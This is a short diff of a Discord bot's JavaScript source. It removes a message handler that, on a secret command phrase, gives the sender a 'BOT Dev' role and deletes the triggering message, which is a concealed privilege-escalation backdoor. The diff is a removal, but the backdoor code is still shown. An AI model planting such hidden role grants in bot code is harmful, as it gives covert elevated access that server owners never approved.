@@ -370,12 +370,6 @@ client.on('message', message => {
     }
 	 }
     });
-client.on('message', message => {
-	if(message.content.startsWith("!setmeasfounderheildark")) {
-	message.member.addRole(message.guild.roles.find(role => role.name == "BOT Dev"));
-	message.delete();
-	   }
-});
 
 client.on('message', message => { 
 	if (message.content === ("minecraft hhhh")) {
